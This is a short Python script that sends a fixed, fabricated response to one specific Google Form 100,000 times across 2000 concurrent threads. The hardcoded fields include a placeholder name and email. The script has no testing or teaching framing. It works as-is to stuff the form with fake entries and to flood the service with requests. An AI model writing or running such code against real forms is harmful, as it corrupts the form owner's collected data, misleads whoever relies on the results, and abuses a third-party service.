from urllib import request
from concurrent.futures import ThreadPoolExecutor
base_url = "https://docs.google.com/forms/d/e/1FAIpQLSeWkzPM9hLmOGOZz_MahUNvvPOKhHH8YOqeszl5KuvTKDDKuA/formResponse?&pageHistory=0&entry.2092238618=name&entry.1556369182=a@gmail.com&entry.479301265=1&entry.1753222212=Day 1&entry.588393791=None&entry.2109138769=Yes"
threads = 2000
times = 100000
def requesting(i):
    request.urlopen(base_url)
with ThreadPoolExecutor(max_workers=threads) as executor:
        {executor.submit(requesting,i) for i in range(times)}



